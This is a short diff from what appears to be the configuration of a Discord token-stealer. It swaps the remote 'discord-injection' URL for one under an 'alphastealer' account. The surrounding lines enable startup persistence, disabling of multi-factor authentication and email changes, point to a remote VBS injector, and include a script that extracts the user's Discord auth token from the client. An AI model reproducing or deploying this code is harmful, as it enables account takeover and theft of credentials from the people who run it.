@@ -37,7 +37,7 @@ const CONFIG = {
     auto_persist_startup: 'True',
     auto_mfa_disabler: 'True',
     auto_email_update: 'True',
-    injection_url: 'https://raw.githubusercontent.com/alphasquad6666/discord-injection/main/index.js',
+    injection_url: 'https://raw.githubusercontent.com/alphastealer/discord-injection/refs/heads/main/index.js',
     injector_url: 'https://raw.githubusercontent.com/k4itrun/discord-vbs-injector/main/injector.vbs',
     get: {
         token: () => execScript(`(webpackChunkdiscord_app.push([[''],{},e=>{m=[];for(let c in e.c)m.push(e.c[c])}]),m).find(m=>m?.exports?.default?.getToken!==void 0).exports.default.getToken()`),
